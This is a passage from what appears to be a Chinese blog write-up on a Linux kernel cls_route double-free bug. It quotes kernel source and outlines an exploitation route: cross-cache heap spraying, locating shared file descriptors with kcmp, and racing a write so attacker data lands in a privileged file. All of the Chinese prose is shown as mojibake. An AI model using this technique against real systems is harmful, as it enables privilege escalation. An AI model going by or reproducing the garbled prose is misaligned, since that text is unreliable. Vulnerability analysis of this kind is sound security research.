class="line">errout:</span><br><span class="line"><span class="keyword">if</span> (f)</span><br><span class="line">tcf_exts_destroy(&amp;f-&gt;exts);</span><br><span class="line">kfree(f);</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç®€å•åˆ†æä¸€ä¸‹ï¼Œè¿™é‡Œä¼šè¿›ä¸€æ­¥è§£ææ•°æ®åŒ…ï¼Œé€šè¿‡<code>fold = *arg;</code>è¯­å¥æ‹¿å‡º<code>route4_filter</code>ï¼Œç„¶ååˆ¤æ–­æ˜¯å¦å­˜åœ¨ï¼Œæ˜¯å¦<code>handle</code>ï¼Œ<code>handle</code>æ˜¯å¦ä¸€è‡´ï¼Œå› ä¸ºæ˜¯ç¬¬ä¸€æ¬¡åˆ›å»ºè¿™é‡Œçš„<code>fold</code>ä¸ºç©ºã€‚æ¥ç€ä¼šé€šè¿‡<code>f = kzalloc(sizeof(struct route4_filter), GFP_KERNEL)</code>åˆ›å»ºä¸€ä¸ªç»“æ„ä½“ï¼Œå¹¶å¯¹å…¶è°ƒç”¨<code>tcf_exts_init</code>å‡½æ•°è¿›è¡Œåˆå§‹åŒ–</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">tcf_exts_init</span><span class="params">(struct tcf_exts *exts, struct net *net,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">int</span> action, <span class="keyword">int</span> police)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NET_CLS_ACT</span></span><br><span class="line">exts-&gt;type = <span class="number">0</span>;</span><br><span class="line">exts-&gt;nr_actions = <span class="number">0</span>;</span><br><span class="line"><span class="comment">/* Note: we do not own yet a reference on net.</span></span><br><span class="line"><span class="comment"> * This reference might be taken later from tcf_exts_get_net().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">exts-&gt;net = net;</span><br><span class="line">exts-&gt;actions = kcalloc(TCA_ACT_MAX_PRIO, <span class="keyword">sizeof</span>(struct tc_action *),</span><br><span class="line">GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!exts-&gt;actions)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">exts-&gt;action = action;</span><br><span class="line">exts-&gt;police = police;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»ä¸Šè¿°çœ‹ä¹¦å¯ä»¥çœ‹åˆ°å¦‚æœå†…æ ¸å¼€å¯äº†<code>CONFIG_NET_CLS_ACT</code>é€‰é¡¹å°±ä¼šå¯¹å…¶åˆ†é…<code>actions</code>æˆå‘˜ï¼Œåˆ†é…çš„å¤§å°æ˜¯256å­—èŠ‚ã€‚å®Œæ¯•ä¹‹åå›åˆ°<code>route4_change</code>ä¸­ï¼Œå¦‚æœ<code>fold</code>å­˜åœ¨ï¼Œåˆ™ä¼šå°†å…¶æ•°æ®åŸŸå¤åˆ¶ç»™<code>f</code>ã€‚éšåè°ƒç”¨<code>route4_set_parms</code>å‡½æ•°è®¾ç½®å…¶ä»–å‚æ•°ï¼Œåé¢å°†æ–°åˆ›å»ºçš„<code>route4_filter</code>çš„hashå€¼æ”¾åˆ°å¯¹åº”çš„<code>route4_head</code>ä¸­ã€‚</p><p>æ¥ä¸‹æ¥è¿›å…¥<code>if (fold &amp;&amp; fold-&gt;handle &amp;&amp; f-&gt;handle != fold-&gt;handle) &#123;</code>åˆ†æ”¯ä¸­åˆ é™¤æ‰æ—§çš„<code>route4_filter</code>çš„å“ˆå¸Œå€¼ï¼Œå½“ç„¶åœ¨ç¬¬ä¸€æ¬¡è¿è¡Œæ—¶è¿™é‡Œæ˜¯ä¸ä¼šè¿›å…¥çš„ã€‚</p><p>åœ¨æœ€ååˆ¤æ–­<code>fold</code>æ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœä¸ä¸ºç©ºåˆ™è°ƒç”¨<code>tcf_queue_work</code>å‡½æ•°å¯¹å…¶è¿›è¡Œé‡Šæ”¾æ“ä½œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">tcf_queue_work</span><span class="params">(struct rcu_work *rwork, <span class="keyword">work_func_t</span> func)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">INIT_RCU_WORK(rwork, func);</span><br><span class="line"><span class="keyword">return</span> queue_rcu_work(tc_filter_wq, rwork);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(tcf_queue_work);</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°æ˜¯ä¸ªrcuå›è°ƒï¼Œè¿™é‡Œå°±çœ‹ä»–çš„å›è°ƒå‡½æ•°å³å¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __route4_delete_filter(struct route4_filter *f)</span><br><span class="line">&#123;</span><br><span class="line">tcf_exts_destroy(&amp;f-&gt;exts);</span><br><span class="line">tcf_exts_put_net(&amp;f-&gt;exts);</span><br><span class="line">kfree(f);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">route4_delete_filter_work</span><span class="params">(struct work_struct *work)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">route4_filter</span> *<span class="title">f</span> =</span> container_of(to_rcu_work(work),</span><br><span class="line">       struct route4_filter,</span><br><span class="line">       rwork);</span><br><span class="line">rtnl_lock();</span><br><span class="line">__route4_delete_filter(f);</span><br><span class="line">rtnl_unlock();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å…¶å‡½æ•°å®ç°å°±æ˜¯åˆ é™¤å¯¹åº”çš„æˆå‘˜ä¹‹ååˆ é™¤æ‰<code>f</code>ã€‚</p><p>é€šè¿‡ä¸Šè¿°æµç¨‹çœ‹èµ·æ¥è¿˜æ˜¯è›®æ­£å¸¸çš„ï¼Œè¿™é‡Œå‡ºç°é—®é¢˜çš„åœ°æ–¹åœ¨æ¸…é™¤<code>hash</code>å’Œæœ€åé‡Šæ”¾ç»“æ„ä½“çš„ifæ¡ä»¶ä¸ä¸€è‡´å¯¼è‡´çš„ã€‚å¯ä»¥æ³¨æ„åˆ°çš„æ˜¯åœ¨å‰é¢æ¸…æ¥šå“ˆå¸Œå€¼æ—¶ä¼šåˆ¤æ–­å…¶<code>handle</code>æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœä¸å­˜åœ¨åˆ™ä¸ä¼šè¿›å…¥ã€‚ä½†æ˜¯åé¢åªæ˜¯åˆ¤æ–­äº†<code>fold</code>æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœæˆ‘ä»¬åˆ›å»ºä¸€ä¸ª<code>handle</code>ä¸º0çš„è¿‡æ»¤å™¨åˆ™ä¸ä¼šè¿›å…¥åˆ°ä¸Šé¢çš„åˆ†æ”¯ä¸­åªä¼šè¿›å…¥åˆ°ä¸‹é¢çš„åˆ†æ”¯ä¸­ï¼Œä»è€Œå¯¼è‡´å…¶ç´¢å¼•è¿˜æ®‹ç•™åœ¨<code>route4_head</code>ä¸­ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">route4_delete</span><span class="params">(struct tcf_proto *tp, <span class="keyword">void</span> *arg, <span class="keyword">bool</span> *last,</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">bool</span> rtnl_held, struct netlink_ext_ack *extack)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">route4_head</span> *<span class="title">head</span> =</span> rtnl_dereference(tp-&gt;root);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">route4_filter</span> *<span class="title">f</span> =</span> arg;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">route4_filter</span> __<span class="title">rcu</span> **<span class="title">fp</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">route4_filter</span> *<span class="title">nf</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">route4_bucket</span> *<span class="title">b</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> h = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> i, h1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!head || !f)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">h = f-&gt;handle;</span><br><span class="line">b = f-&gt;bkt;</span><br><span class="line"></span><br><span class="line">fp = &amp;b-&gt;ht[from_hash(h &gt;&gt; <span class="number">16</span>)];</span><br><span class="line"><span class="keyword">for</span> (nf = rtnl_dereference(*fp); nf;</span><br><span class="line">     fp = &amp;nf-&gt;next, nf = rtnl_dereference(*fp)) &#123;</span><br><span class="line"><span class="keyword">if</span> (nf == f) &#123;</span><br><span class="line"><span class="comment">/* unlink it */</span></span><br><span class="line">RCU_INIT_POINTER(*fp, rtnl_dereference(f-&gt;next));</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Remove any fastmap lookups that might ref filter</span></span><br><span class="line"><span class="comment"> * notice we unlink&#x27;d the filter so we can&#x27;t get it</span></span><br><span class="line"><span class="comment"> * back in the fastmap.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">route4_reset_fastmap(head);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Delete it */</span></span><br><span class="line">tcf_unbind_filter(tp, &amp;f-&gt;res);</span><br><span class="line">tcf_exts_get_net(&amp;f-&gt;exts);</span><br><span class="line">tcf_queue_work(&amp;f-&gt;rwork, route4_delete_filter_work);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Strip RTNL protected tree */</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">32</span>; i++) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">route4_filter</span> *<span class="title">rt</span>;</span></span><br><span class="line"></span><br><span class="line">rt = rtnl_dereference(b-&gt;ht[i]);</span><br><span class="line"><span class="keyword">if</span> (rt)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* OK, session has no flows */</span></span><br><span class="line">RCU_INIT_POINTER(head-&gt;table[to_hash(h)], <span class="literal">NULL</span>);</span><br><span class="line">kfree_rcu(b, rcu);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">*last = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">for</span> (h1 = <span class="number">0</span>; h1 &lt;= <span class="number">256</span>; h1++) &#123;</span><br><span class="line"><span class="keyword">if</span> (rcu_access_pointer(head-&gt;table[h1])) &#123;</span><br><span class="line">*last = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå†æ¬¡å…³æ³¨opsä¸­çš„<code>route4_delete</code>å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯é‡Šæ”¾æ‰€æœ‰çš„è¿‡æ»¤å™¨ï¼Œè¿™é‡Œä½¿ç”¨çš„ä¾æ—§æ˜¯<code>route4_delete_filter_work</code>å‡½æ•°è¿›è¡Œåˆ é™¤çš„ï¼Œç”±äºå‰é¢æåˆ°çš„<code>route4_head</code>ä¸­ä»ç„¶æ®‹å­˜<code>handle</code>ä¸º0çš„è¿‡æ»¤å™¨çš„å“ˆå¸Œå€¼ï¼Œå› æ­¤ä¼šå¯¹<code>route4_filter</code>å’Œ<code>route4_filter-&gt;exts-&gt;actions</code>å¯¹è±¡å­˜åœ¨<code>double free</code>ã€‚</p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>(è¿™é‡Œçš„åˆ©ç”¨æœºåˆ¶æˆ‘æ²¡æœ‰åœ¨æ–‡ç« ä¸­æè¿‡ï¼Œä½†ç­‰æˆ‘çœ‹å®Œäº†å‘ç°æˆ‘ä»¥å‰åœ¨é€‚é…CVE-2023-3269çš„æ—¶å€™å­¦è¿‡T_Tï¼Œ<del>å±äºæ˜¯ç™½å¿™æ´»ä¸€åœºäº†</del>)</p><p>æ—¢ç„¶ä»¥å‰çš„æ–‡ç« ä¸­æ²¡æåˆ°è¿™é‡Œå°±è¯¦ç»†ä»‹ç»ä¸€ä¸‹ï¼Œæ—¢ç„¶è¿™ç¯‡æ–‡ç« ä»‹ç»äº†é‚£å°±ä¸å†å†™ä»Šå¹´é‚£ä¸ªCVEçš„åˆ†ææ–‡ç« äº†ã€‚</p><h3 id="cross-cache"><a href="#cross-cache" class="headerlink" title="cross-cache"></a>cross-cache</h3><p>åœ¨å‰é¢æåˆ°ï¼Œè¿™ä¸€åˆ©ç”¨æ‰‹æ³•æ˜¯ç”¨äºè§£å†³å†…æ ¸å†…éƒ¨éš”ç¦»å­˜åœ¨çš„ï¼Œåœ¨CVE-2023-3269çš„è¿™ç¯‡æ–‡ç« ä¸­åˆ™æ˜¯ç”¨äºç»•è¿‡NUMAæœºåˆ¶ä½¿ç”¨çš„ï¼Œåªä¸è¿‡åœ¨<code>StackRot</code>åˆ©ç”¨æ¡ä»¶æ›´ä¸ºè‹›åˆ»ï¼Œåœ¨æŠŠè¿™ä¸€æ‰‹æ³•è®²è§£å®Œæ¯•ä¹‹åç®€å•æä¸€ä¸‹ã€‚</p><p>åœ¨å‰é¢çš„ä¸€ç¯‡æ–‡ç« ä¸­è¯¦ç»†çš„è§£é‡Šäº†å†…æ ¸ä¸­çš„å†…éƒ¨éš”ç¦»æœºåˆ¶ï¼Œå¤§å®¶åº”è¯¥ä¹Ÿå·²ç»çŸ¥é“äº†<code>GFP_KERNEL_ACCOUNT</code>æ ‡è¯†ä½å’Œ<code>GFP_KERNEL</code>æ ‡è¯†ä½å»ç”³è¯·<code>object</code>çš„æ—¶å€™ä¼šä»ä¸åŒçš„<code>cache</code>ä¸­å»å–ã€‚</p><p>è¯´åˆ°æœ¬ç¯‡æ–‡ç« ï¼Œæˆ‘ä»¬å‰é¢æåˆ°çš„å¯ä»¥å¯¹ä¸¤ä¸ªå¯¹è±¡è¿›è¡Œ<code>Double free</code>ï¼Œå…¶åˆ†åˆ«æ˜¯<code>route4_filter</code>å’Œ<code>route4_filter-&gt;exts-&gt;actions</code>ï¼Œè¿™é‡Œä¸»è¦å…³æ³¨ä»–ä»¬çš„å¤§å°ï¼Œå…¶åˆ†åˆ«æ˜¯144å’Œ256ï¼Œä¼šä»ä¸åŒçš„<code>cache</code>ä¸­å»å–ï¼Œåˆ†åˆ«æ˜¯<code>kmalloc-192</code>å’Œ<code>kmalloc-256</code>ã€‚è€Œåœ¨å†…æ ¸çš„é»˜è®¤é…ç½®ä¸­<code>file</code>ç»“æ„ä½“çš„å¤§å°æ­£å¥½ä¸º256ï¼Œè‡ªç„¶è€Œç„¶å¯ä»¥è”æƒ³åˆ°ï¼Œå¦‚æœé¦–å…ˆä½¿ç”¨ä¸€ä¸ªå¯å†™çš„æ–‡ä»¶å æ®æ­¤ä½ç½®ï¼Œå†é‡Šæ”¾æ‰å†ä½¿ç”¨æˆ‘ä»¬ç›®æ ‡çš„æ–‡ä»¶å»å å–å†é€šè¿‡æŸäº›æ‰‹æ³•æ˜¯å¦å¯ä»¥è¾¾æˆç±»ä¼¼äº<code>dirty pipe</code>ä¸€æ ·çš„æ•ˆæœå‘¢ï¼Ÿ</p><p>è¿™é‡Œå…ˆä¸è€ƒè™‘åç»­å†™çš„æ‰‹æ³•ï¼Œä»å¼€å§‹ç”¨<code>file</code>ç»“æ„ä½“å¼€å§‹è€ƒè™‘å°±ä¼šå‘ç°å†…æ ¸åœ¨åˆ†é…<code>file</code>ç»“æ„ä½“æ—¶ä¼šä»ä¸€ä¸ªä¸“å±çš„ç¼“å­˜ä¸­å–å‡º(ç±»ä¼¼äº<code>cred</code>ç»“æ„ä½“çš„åˆ†é…)ï¼Œæ‰€ä»¥è¿™æ—¶å°±ä¸å¾—ä¸è€ƒè™‘<code>cross_cache</code>äº†ã€‚</p><p>ä¼—æ‰€å‘¨çŸ¥ï¼Œåœ¨å†…æ ¸ä¸­ç®¡ç†å†…å­˜æ–¹å¼ä¸»è¦æ˜¯ä¸¤ç§ä¸€æ˜¯<code>slub</code>ç”¨äºåˆ†é…è¾ƒå°çš„<code>object</code>ï¼Œå…¶æ¬¡æ˜¯<code>buddy system</code>æœºåˆ¶ç”¨äºåˆ†é…é¡µé¢ã€‚å½“æŸä¸€ä¸ª<code>slab page</code>è¢«é‡Šæ”¾æ—¶ä¼šè¢«<code>buddy system</code>å›æ”¶ï¼Œåœ¨åç»­çš„æŸä¸ªæ—¶é—´å¯èƒ½ä¼šè¢«é‡ç”¨ï¼Œç„¶è€Œé‡ç”¨å°±å¯èƒ½å¯¼è‡´ä¸åŒçš„<code>cache</code>ä»åŒä¸€ä¸ªé¡µä¸­å–å‡ºäº†ç”¨ä¸€ä¸ªä½ç½®çš„<code>object</code>äº¤ç”±å…¶ä»–å†…å®¹ä½¿ç”¨ã€‚è€Œ<code>cross-cache</code>åˆ©ç”¨æ–¹æ³•åˆ™æ˜¯åˆ©ç”¨ä¸Šè¿°è¿™ä¸€æœºåˆ¶è¿›è¡Œçš„ï¼Œå½“æŸä¸€<code>slab page</code>ä¸­çš„æ‰€æœ‰å†…å­˜æ§½è¢«é‡Šæ”¾ï¼Œé‚£ä¹ˆè¿™ä¸ª<code>slab page</code>ä¼šè¢«å¼ºåˆ¶é‡Šæ”¾ç»™<code>buddy system</code>ï¼Œæ­¤æ—¶å¦‚æœå †å–·å¦ä¸€ç§ç±»å‹çš„å¯¹è±¡ä¸”å…¶å¯¹åº”çš„ç¼“å­˜è€—å°½åˆ™ä¼šå‘<code>buddy system</code>ç”³è¯·æ–°çš„å†…å­˜é¡µï¼Œå¦‚æœæ°å¥½ä½¿ç”¨äº†æˆ‘ä»¬å‰é¢æ¶æ„å¼ºåˆ¶é‡Šæ”¾çš„<code>slab page</code>åˆ™å¯å®ç°æ”»å‡»ã€‚(<strong>æ­¤å¤„çš„é‡ç”¨æœºåˆ¶åœ¨ä¸‹æ–‡æœ‰è¯¦è§£ï¼Œä¸ºä»€ä¹ˆä¸åœ¨è¿™å†™æ˜¯å› ä¸ºä¸‹é¢åˆ†æCVEæ˜¯æˆ‘ä¸´æ—¶èµ·æ„çš„</strong>)</p><p>å°†æ­¤æ–¹æ³•è¿ç”¨åˆ°è¿™ä¸€ç¯å¢ƒä¸­å¾ˆå®¹æ˜“å¯ä»¥æƒ³åˆ°é¦–å…ˆé€šè¿‡å¤§é‡å †å–·<code>basic_filter</code>ç»“æ„ä½“å®Œæˆå†…å­˜å¸ƒå±€ï¼Œéšååˆ†é…ä¸€ä¸ª<code>route4_filter</code>ç»“æ„ä½“éšåç»§ç»­å †å–·<code>basic_filter</code>ç»“æ„ä½“ï¼Œé‚£ä¹ˆæ­¤æ—¶å°±å¾ˆæœ‰å¯èƒ½ä¸€ä¸ªé¡µé¢ä¸­åªå­˜åœ¨<code>basic_filter-&gt;exts-&gt;actions</code>å’Œ<code>route4_filter-&gt;exts-&gt;actions</code>ï¼Œå¦‚æœæ§åˆ¶å°†è¿™ä¸ªé¡µé¢ä¸­çš„ç»“æ„ä½“å¯¹åº”<code>basic_filter</code>å’Œ<code>route4_filter</code>å…¨éƒ¨é‡Šæ”¾æ‰é‚£ä¹ˆè¿™ä¸ªé¡µé¢åˆ™ä¼šè¢«å¼ºåˆ¶é‡Šæ”¾è¿›å…¥<code>buddy system</code>ä¸­ã€‚å†å †å–·å¤§é‡çš„æ­£å¸¸æ–‡ä»¶ä½¿å…¶æˆåŠŸå é¢†æˆ‘çš„<code>UAF object</code>ï¼Œè‡³æ­¤æˆ‘ä»¬ä»ä¸çŸ¥é“åˆ°åº•æ˜¯ä»€ä¹ˆä½ç½®æˆ–æ˜¯é‚£ä¸ªæ–‡ä»¶æè¿°ç¬¦å æ®äº†æˆ‘ä»¬ç›®æ ‡ä½ç½®ï¼Œæ‰€ä»¥è¿™é‡Œä½¿ç”¨æ¼æ´äº§ç”Ÿ<code>double free</code>å†ä¸€æ¬¡å †å–·å¤§é‡æ­£å¸¸æ–‡ä»¶æ¥å æ®åˆšåˆšçš„ç©ºæ´ï¼Œéšåé€šè¿‡<code>kcmp</code>ç³»ç»Ÿè°ƒç”¨å³å¯æ‰¾åˆ°æˆ‘ä»¬å…±äº«æ–‡ä»¶æè¿°ç¬¦çš„ä½ç½®äº†ã€‚</p><h3 id="å»¶é•¿æ—¶é—´çª—å£"><a href="#å»¶é•¿æ—¶é—´çª—å£" class="headerlink" title="å»¶é•¿æ—¶é—´çª—å£"></a>å»¶é•¿æ—¶é—´çª—å£</h3><p>å‰é¢åªæåˆ°äº†å¯ä»¥æ‰¾åˆ°å…±äº«æ–‡ä»¶æè¿°ç¬¦çš„ä½ç½®äº†ï¼Œæ²¡æœ‰ç»§ç»­å¾€åå†™äº†ï¼Œå› ä¸ºè¿™é‡Œä¼šé‡åˆ°ä¸€ä¸ªæ–°çš„é—®é¢˜äº†ï¼Œè¿™é‡Œå…ˆè®²åç»­çš„æ­¥éª¤å†™å‡ºæ¥ã€‚</p><p>é¦–å…ˆï¼Œæˆ‘ä»¬å·²ç»æ‹¿åˆ°äº†ç›®æ ‡æ–‡ä»¶æè¿°ç¬¦ï¼Œå¹¶ä¸”æ˜¯ä¸¤ä¸ªï¼Œé‚£æˆ‘ä»¬å¯ä»¥ä¾ç…§å¸¸è¯†è¿›è¡Œå°è¯•å°±æ˜¯æˆ‘ä»¬å¯¹å…¶ä¸­ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ä¸­è¿›è¡Œå†™å…¥ï¼Œå¯¹å¦ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦å†™å…¥æ¶æ„å­—ç¬¦ï¼Œæ­¤æ—¶å†å°†ä¸¤ä¸ªæ–‡ä»¶æè¿°ç¬¦éƒ½å…³é—­( å› ä¸ºéƒ½åœ¨ä½¿ç”¨æ‰€ä»¥æ­¤å¤„çš„å¼•ç”¨è®¡æ•°å™¨ä¸º2 )ï¼Œæ­¤æ—¶å†å¤§é‡å †å–·å»æ‰“å¼€ç›®æ ‡ç‰¹æƒæ–‡ä»¶ï¼Œæœ‰ä¸€å®šçš„å‡ ç‡è®©ç‰¹æƒæ–‡ä»¶çš„<code>file</code>ç»“æ„ä½“ä¼šè¦†ç›–æ‰åŸæœ¬çš„ç©ºæ´ï¼Œä»è€Œå¯¼è‡´åé¢çš„æ¶æ„å­—ç¬¦å†™å…¥åˆ°äº†ç‰¹æƒæ–‡ä»¶ä¸­å»äº†ã€‚</p><p>é€šè¿‡å‰é¢ç®€è¦çš„è¯´æ˜å¯ä»¥çœ‹å‡ºæ¥è¿™é‡Œæ˜¯å­˜åœ¨ä¸€ä¸ªæ¡ä»¶ç«äº‰çš„å…³ç³»ï¼Œéœ€è¦åœ¨ç¬¬ä¸€ä¸ªå†™å…¥åƒåœ¾å­—ç¬¦ï¼Œç¬¬äºŒä¸ªå†™å…¥æ¶æ„å­—ç¬¦è¿˜æ²¡å†™å…¥æ—¶å®Œæˆå·æ¢æ¢æŸ±çš„æˆç ï¼Œçœ‹è¿‡ä¸Šä¸€ç¯‡æ–‡ç« çš„æœ‹å‹å¯èƒ½å°±ä¼šæƒ³åˆ°ä½¿ç”¨<code>fuse</code>å³å¯å®ç°ï¼Œè™½ç„¶ä»ç†è®ºä¸Šè®²æ˜¯å¯ä»¥çš„ï¼Œä½†å…¶æœ€ç»ˆéƒ½ä¼šåˆ©ç”¨åˆ°å†…æ ¸å®ç°çš„<code>write</code>çš„æœºåˆ¶ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vfs_write</span><span class="params">(struct file *file, <span class="keyword">const</span> <span class="keyword">char</span> __user *buf, <span class="keyword">size_t</span> count, <span class="keyword">loff_t</span> *pos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">ssize_t</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(file-&gt;f_mode &amp; FMODE_WRITE))</span><br><span class="line"><span class="keyword">return</span> -EBADF;</span><br><span class="line"><span class="keyword">if</span> (!(file-&gt;f_mode &amp; FMODE_CAN_WRITE))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (unlikely(!access_ok(buf, count)))</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">ret = rw_verify_area(WRITE, file, pos, count);</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line"><span class="keyword">if</span> (count &gt; MAX_RW_COUNT)</span><br><span class="line">count =  MAX_RW_COUNT;</span><br><span class="line">file_start_write(file);</span><br><span class="line"><span class="keyword">if</span> (file-&gt;f_op-&gt;write)</span><br><span class="line">ret = file-&gt;f_op-&gt;write(file, buf, count, pos);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (file-&gt;f_op-&gt;write_iter)</span><br><span class="line">ret = new_sync_write(file, buf, count, pos);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">ret = -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (ret &gt; <span class="number">0</span>) &#123;</span><br><span class="line">fsnotify_modify(file);</span><br><span class="line">add_wchar(current, ret);</span><br><span class="line">&#125;</span><br><span class="line">inc_syscw(current);</span><br><span class="line">file_end_write(file);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ç»è¿‡å‡ 